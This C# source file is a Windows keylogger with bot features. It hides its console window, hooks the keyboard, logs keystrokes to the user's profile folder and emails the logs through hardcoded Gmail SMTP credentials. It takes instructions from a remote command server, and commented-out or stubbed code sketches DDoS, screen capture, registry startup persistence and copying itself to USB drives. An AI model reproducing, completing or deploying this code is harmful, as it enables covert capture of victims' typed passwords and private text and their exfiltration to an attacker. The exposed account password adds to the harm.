using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;
using System.Net;
using System.Net.Mail;
using Microsoft.Win32;
using System.Windows.Input;
using System.Net.Sockets;
using System.Drawing.Imaging;
using System.Drawing;

namespace Karios
{
    class InterceptKeys
    {
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookId = IntPtr.Zero;
        private static string _localIp;
        private static string _globalTargetIp;
        private static string _website;
        private static bool _online = false;
        public static string Commands = "";

        public static void Main()
        {
            Console.WriteLine("Starting commandget");
            Console.ReadKey();
            CommandGet();
            Console.WriteLine("Finished commandget");
            Console.ReadKey();
            if (_online)
            {
                Console.WriteLine("Online does equal true");
                Console.ReadKey();

                // Persitance feature
                // Duplicate(); 
                // Run on startup 
                // SetStartup();
                // Start Application
                var handle = GetConsoleWindow();
                ShowWindow(handle, SwHide);
                _hookId = SetHook(_proc);
                Application.Run();
                UnhookWindowsHookEx(_hookId);
            }
            Console.WriteLine("IF Statement did not work... exiting");
            Console.ReadKey();
        }

        public static void RunApplication()
        {
            // Hide the window


            // Persitance feature
            // Duplicate(); 

            // Run on startup 
            // SetStartup();
            // Start Application

            //Application.Run();
            //UnhookWindowsHookEx(_hookID);
        }

        private static void CommandGet()
        {
            try
            {
                var serverAddress = "http://cutenesss.xyz/server.php";

                var client = new WebClient();

                var secret = "<3"; //A string to use as the version ID. Use it for testing the client.


                //In future versions, this hash will be secret and enforced - Makes sure everyone is running latest client
                var getIterations = -1;
                var target = "";
                var loop = true; // So we can break the loop
                while (loop)
                {
                    if (getIterations != -1 && (target == "" || getIterations <= 9) && target != "") continue;
                    //Log("Asking the server for commands");
                    var paramaters = "?";

                    //Tells the server that this is a client, and not a web browser
                    if (paramaters == "?")
                        paramaters = paramaters + "isclient=true";
                    else
                        paramaters = paramaters + "&isclient=true";

                    //Analytical: Tells server this is a new client
                    //(Will probably be implemented in a newer version)
                    if (getIterations == -1)
                    {
                        //Telling the server this is a new client
                        if (paramaters == "?")
                            paramaters = paramaters + "newclient=true";
                        else
                            paramaters = paramaters + "&newclient=true";
                    }
                    else
                    {
                        if (paramaters == "?")
                            paramaters = paramaters + "newclient=false";
                        else
                            paramaters = paramaters + "&newclient=false";
                    }
                    /*
                        // 1 = DDOSOnline
                        if (paramaters == "?")
                            paramaters = paramaters + "ddosonline=true";
                        else
                            paramaters = paramaters + "&ddosonline=true";

                        // 2 = DDOSIP
                        if (paramaters == "?")
                            paramaters = paramaters + "ddosip=true";
                        else
                            paramaters = paramaters + "&ddosip=true";

                        // 3 = KeyloggerOnline
                        if (paramaters == "?")
                            paramaters = paramaters + "keyonline=true";
                        else
                            paramaters = paramaters + "&keyonline=true";

                        // 3 = KeyloggerOnline
                        if (paramaters == "?")
                            paramaters = paramaters + "keyonline=true";
                        else
                            paramaters = paramaters + "&keyonline=true";

                        // 4 = KeyloggerEmail
                        if (paramaters == "?")
                            paramaters = paramaters + "keyloggeremail=true";
                        else
                            paramaters = paramaters + "&keyloggeremail=true";

                        // 5 = CaptureSceen
                        if (paramaters == "?")
                            paramaters = paramaters + "capturescreen=true";
                        else
                            paramaters = paramaters + "&capturescreen=true";

                        // 6 = Startup
                        if (paramaters == "?")
                            paramaters = paramaters + "startup=true";
                        else
                            paramaters = paramaters + "&startup=true";

                        // 7 = Duplication
                        if (paramaters == "?")
                            paramaters = paramaters + "duplication=true";
                        else
                            paramaters = paramaters + "&duplication=true";

                        // 8 = Reverse
                        if (paramaters == "?")
                            paramaters = paramaters + "reverse=false";
                        else
                            paramaters = paramaters + "&reverse=false";
                        */

                    var commands = "";
                    try
                    {
                        commands = client.DownloadString(serverAddress + paramaters);
                    }
                    catch (WebException)
                    {
                    } //TODO: Handle this Exception.
                    var preppedCommand = commands.Split(' ');
#pragma warning disable 1587
                    /// <summary>
                    /// COMMANDS : IMPORTANT : 
                    /// 0 = Online 
                    /// 1 = DDOSOnline
                    /// 2 = DDOSIP
                    /// 3 = KeyloggerOnline
                    /// 4 = Keylogger email
                    /// 5 = Capture screen
                    /// 6 = Startup
                    /// 7  = Duplication
                    /// 8 = Reverse everything
                    /// </summary>
#pragma warning restore 1587

                    if (preppedCommand[0] == "Online=True")
                    {
                        _online = true;
                    }
                    else
                    {
                        //Online = false;
                    }
                    loop = false;
                }
            }
            catch
            {
            }
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (var curProcess = Process.GetCurrentProcess())
            using (var curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                    GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode < 0 || wParam != (IntPtr)WM_KEYDOWN) return CallNextHookEx(_hookId, nCode, wParam, lParam);
            var appName = AppDomain.CurrentDomain.FriendlyName;
            var vkCode = Marshal.ReadInt32(lParam);
            var fileName = DateTime.Now.ToString("yyyy-MM-dd");
            // StreamWriter sw = new StreamWriter(Application.StartupPath + @"\log.txt", true);
            var pathToLog = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\" +
                            fileName + ".txt"; // TODO - get more secret location.
            var sw = new StreamWriter(pathToLog, true);
            if ((Keys)vkCode != Keys.Space && (Keys)vkCode != Keys.Enter)
            {
                sw.Write(((Keys)vkCode).ToString().ToLower());
                Console.Write(((Keys)vkCode).ToString().ToLower());
            }
            else
            {
                sw.WriteLine("");
                sw.WriteLine((Keys)vkCode);
                Console.WriteLine((Keys)vkCode);
            }
            sw.Close();

            if (File.ReadAllLines(pathToLog).Length <= 100) return CallNextHookEx(_hookId, nCode, wParam, lParam);
            try
            {
                var mail = new MailMessage();
                var smtpServer = new SmtpClient("smtp.gmail.com"); // VSCode is suggesting another library, "MimeKit" - should be on GitHub if you want to check it out at https://github.com/jstedfast/MimeKit. It may need us to rewrite some code if we do implement it though -- STBoyden
                mail.From = new MailAddress("GINGIRULES@gmail.com");
                mail.To.Add("GINGIRULES@gmail.com");
                mail.Subject = "log from keylogger on" +
                               Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
                mail.Body = "New log file from Computer (" + GetLocalIp(_localIp) + " , finshed at: " +
                            DateTime.Now.ToString("yyyy-MM-dd");
                var attachment = new Attachment(pathToLog);
                mail.Attachments.Add(attachment);
                smtpServer.Port = 587;
                smtpServer.Credentials = new NetworkCredential("GINGIRULES@gmail.com", "G1ng1RuleS");
                smtpServer.EnableSsl = true;
                smtpServer.Send(mail);
                //clear mail attachment
                attachment.Dispose();
                //copy program to an new destination
            }
            catch
            {
            }

            //System.IO.File.Copy(path, Application.StartupPath + @"\log.txt", true);
            var alldrives = DriveInfo.GetDrives();

            /*
                    foreach (DriveInfo d in alldrives)
                    {
                        if (d.DriveType == DriveType.Removable && d.IsReady)
                        {
                            File.Copy(Application.StartupPath + @"\" + System.AppDomain.CurrentDomain.FriendlyName
                                , d.Name + @"\" + System.AppDomain.CurrentDomain.FriendlyName, true);
                        }
                    }
                    */
            //delete log file.
            File.Delete(pathToLog);
            return CallNextHookEx(_hookId, nCode, wParam, lParam);
        }

        /// <summary>
        /// Sets the startup registary key
        /// </summary>
        public static void SetStartup()
        {
            /*
            RegistryKey rkApp = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            string pathToSecCopy = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\" + AppDomain.CurrentDomain.FriendlyName;
            string pathToApp = Application.ExecutablePath;
            if (rkApp.GetValue(System.AppDomain.CurrentDomain.FriendlyName) == null)
            {
                rkApp.SetValue(System.AppDomain.CurrentDomain.FriendlyName, pathToSecCopy);
            }
            */
        }

        public static void Duplicate()
        {
            /*
            if (Application.StartupPath != Environment.GetFolderPath(Environment.SpecialFolder.UserProfile))
            {
                System.IO.File.Copy(Application.StartupPath + @"\" + System.AppDomain.CurrentDomain.FriendlyName
                                , Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\" + AppDomain.CurrentDomain.FriendlyName, true);
            }
            */
        }


        public static string GetLocalIp(string localIp)
        {
            using (var socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, 0))
            {
                try
                {
                    socket.Connect("8.8.8.8", 65530);
                    var endPoint = socket.LocalEndPoint as IPEndPoint;
                    if (endPoint != null) localIp = endPoint.Address.ToString();
                    return localIp;
                }
                finally
                {
                    //do something
                }
            }
        }

        public static void LaunchWebsite()
        {
            using (var wc = new WebClient())
            {
                try
                {
                }
                catch
                {
                }
            }
        }

        public static void Ddos()
        {
            using (var wc = new WebClient())
            {
                try
                {
                }
                catch
                {
                }
            }
        }

        private static Image CaptureDesktop()
        {
            var rectangle = Screen.PrimaryScreen.Bounds;
            var bitmap = new Bitmap(rectangle.Width, rectangle.Height, PixelFormat.Format32bppArgb);
            var graphics = Graphics.FromImage(bitmap);
            graphics.CopyFromScreen(rectangle.X, rectangle.Y, 0, 0, rectangle.Size, CopyPixelOperation.SourceCopy);
            return bitmap;
        }

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook,
            LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        private const int SwHide = 0;
    }
}